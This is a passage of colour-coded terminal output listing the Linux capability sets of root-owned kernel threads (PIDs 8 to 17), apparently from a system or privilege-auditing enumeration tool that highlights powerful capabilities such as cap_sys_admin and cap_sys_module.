  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 8 (kworker/0:0H-events_highpri) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 10 (mm_percpu_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 11 (rcu_tasks_kthread) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 12 (rcu_tasks_rude_kthread) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 13 (rcu_tasks_trace_kthread) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 14 (ksoftirqd/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 15 (rcu_preempt) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 16 (migration/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 17 (kworker/0:1-events) user=root
  CapInh: 0x0000000000000000=
